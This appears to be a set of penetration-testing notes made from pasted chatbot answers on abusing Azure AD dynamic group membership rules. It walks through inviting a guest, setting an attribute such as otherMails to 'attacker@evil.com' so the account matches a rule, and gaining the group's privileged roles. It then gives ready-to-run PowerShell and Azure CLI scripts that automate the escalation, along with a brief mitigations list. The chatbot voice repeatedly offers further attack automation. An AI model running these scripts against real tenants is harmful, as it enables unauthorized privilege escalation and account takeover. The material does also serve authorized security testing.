# Dynamic group abuse

Here's a **summarized, corrected, and rewritten** version of the process for **abusing Azure AD Dynamic Groups** in the context of an **Azure penetration test**:

**🔐 Attacking Azure: Dynamic Group Abuse**

**Overview:**\
Azure AD Dynamic Groups automatically add or remove users based on rules (e.g., email domain, attributes). If misconfigured, these can be abused—especially through **malicious guest invitations**—to escalate privileges or gain broader access.

**🛠️ Attack Steps**

**1. Enumerate Dynamic Groups**

Use AzureAD or AzureADPreview module:

Import-Module AzureADPreview

Connect-AzureAD

\# List all dynamic groups

Get-AzureADMSGroup \| Where-Object { \$\_.GroupTypes -contains "DynamicMembership" } \| Format-Table DisplayName, Id, MembershipRule

**2. Analyze Membership Rules**

In the Azure Portal:

- Go to **Azure AD → Groups**

- Identify dynamic groups

- Open a group → Check “**Dynamic Membership Rules**”

Example: A rule like user.otherMails -contains "@evil.com" could be abused.

**3. Invite a Malicious Guest User**

In Azure Portal:

- Navigate to **Azure AD → Users → New Guest User**

- Fill out and submit the invitation form

- After submission, resend the invite and copy the new URL

- Open the link in **Incognito** mode, sign in, and accept the invitation

**4. Modify Guest Attributes to Match Rule**

Now modify the guest account to match the group’s dynamic rule.

\# Set a secondary email (e.g., to match a rule like "otherMails -contains '@evil.com'")

Set-AzureADUser -ObjectId \<GUEST_OBJECT_ID\> -OtherMails @("attacker@evil.com")

**5. Wait for Propagation**

- Azure AD may take a few minutes to apply changes

- Then confirm group membership:

Get-AzureADGroupMember -ObjectId \<DYNAMIC_GROUP_OBJECT_ID\>

**🎯 Impact**

If the dynamic group grants **privileged access (e.g., Global Admin, App Admin, Intune Role)**, the attacker now inherits those roles **automatically and silently** just by matching the group rule.

**🛡️ Mitigations**

- Avoid using user-controllable attributes in dynamic membership rules (like user.otherMails)

- Restrict guest user permissions

- Use conditional access and entitlement management

Would you like an automated PowerShell script version of this attack flow?

## PowerShell

Here is an **automated PowerShell script** that demonstrates the **abuse of Azure AD Dynamic Groups** in a penetration testing context. This script assumes the attacker already has guest invite permissions and access to the AzureADPreview module.

**⚠️ DISCLAIMER**

Use this script **only in authorized environments** for security testing or red teaming. Misuse can result in legal consequences.

**✅ PowerShell Script: Dynamic Group Abuse in Azure AD**

\# Load AzureADPreview Module

Import-Module AzureADPreview

\# Connect to Azure AD

Connect-AzureAD

\# Step 1: Enumerate Dynamic Groups

Write-Host "\`n\[+\] Enumerating Dynamic Membership Groups..."

\$dynGroups = Get-AzureADMSGroup \| Where-Object { \$\_.GroupTypes -contains "DynamicMembership" }

\$dynGroups \| Format-Table DisplayName, Id, MembershipRule

\# Step 2: Manually invite guest via Portal and get ObjectId

\# Replace with real Object ID from invited user

\$guestObjectId = "\<REPLACE_WITH_GUEST_OBJECT_ID\>"

\# Step 3: Modify 'OtherMails' to match dynamic rule

Write-Host "\`n\[+\] Setting secondary email to trigger dynamic rule..."

Set-AzureADUser -ObjectId \$guestObjectId -OtherMails @("attacker@evil.com") -Verbose

\# Step 4: Wait for dynamic group sync

Write-Host "\`n\[+\] Waiting 2-5 minutes for dynamic group processing..."

Start-Sleep -Seconds 180

\# Step 5: Check group membership

foreach (\$group in \$dynGroups) {

\$members = Get-AzureADGroupMember -ObjectId \$group.Id

if (\$members.ObjectId -contains \$guestObjectId) {

Write-Host "\[+\] SUCCESS: Guest user is a member of dynamic group '\$(\$group.DisplayName)'"

} else {

Write-Host "\[-\] Guest not yet added to '\$(\$group.DisplayName)'"

}

}

**🧪 Test Lab Recommendations**

To safely test this:

- Set up a dynamic group in Azure AD

- Use a rule like user.otherMails -contains "@evil.com"

- Invite a guest with that email pattern

Would you like a version of this in Bash using Azure CLI instead of PowerShell?

## Azure CLI

Here is the **Azure CLI version** of the **Dynamic Group Abuse** script for penetration testing use, rewritten for clarity and adapted to CLI syntax.

**⚠️ DISCLAIMER**

**Use this only in environments you are authorized to test.** Unauthorized use can violate laws and policies.

**✅ Azure CLI Script: Abusing Azure AD Dynamic Groups**

\# Step 1: Log in to Azure

az login

\# Optional: Select the right subscription

\# az account set --subscription "\<SUBSCRIPTION_ID\>"

\# Step 2: List all dynamic groups

echo "\[+\] Listing dynamic membership groups..."

az ad group list --query "\[?groupTypes\[?contains(@, 'DynamicMembership')\]\].{Name:displayName, ID:id}" -o table

\# Step 3: Invite a new guest user (use real email)

echo "\[+\] Inviting guest user..."

az ad user create --display-name "Evil Guest" \\

--user-principal-name evilguest@yourtenant.onmicrosoft.com \\

--password "TempPassword123!" \\

--force-change-password-next-login false

\# NOTE: You may need to invite external users via MS Graph or portal for full guest features.

\# Step 4: Set the guest user's secondary email (not directly possible in az CLI, use Graph API or preview SDK)

\# Instead, you can update attributes like jobTitle or department that match dynamic rules:

echo "\[+\] Updating guest user attributes to match dynamic rule..."

az ad user update --id evilguest@yourtenant.onmicrosoft.com --set jobTitle="Contractor"

\# Step 5: Wait for membership sync

echo "\[+\] Waiting for dynamic group engine to process membership (2-5 mins)..."

sleep 180

\# Step 6: Verify if guest user is in the dynamic group

\# Replace \<GROUP_ID\> with the dynamic group’s Object ID

GROUP_ID="\<REPLACE_WITH_DYNAMIC_GROUP_ID\>"

echo "\[+\] Checking if guest is a member of the group..."

az ad group member list --group "\$GROUP_ID" --query "\[?userPrincipalName=='evilguest@yourtenant.onmicrosoft.com'\]" -o table

**How to Find Dynamic Group Rules (if needed via Graph):**

Azure CLI doesn't expose membershipRule directly. You can use Microsoft Graph API:

az rest --method GET \\

--uri "https://graph.microsoft.com/beta/groups?\$filter=groupTypes/any(c:c eq 'DynamicMembership')" \\

--headers 'Content-Type=application/json'

Would you like a **Graph API automation script** (e.g., in Python or Bash with curl) for full control over attributes like OtherMails or membershipRule?
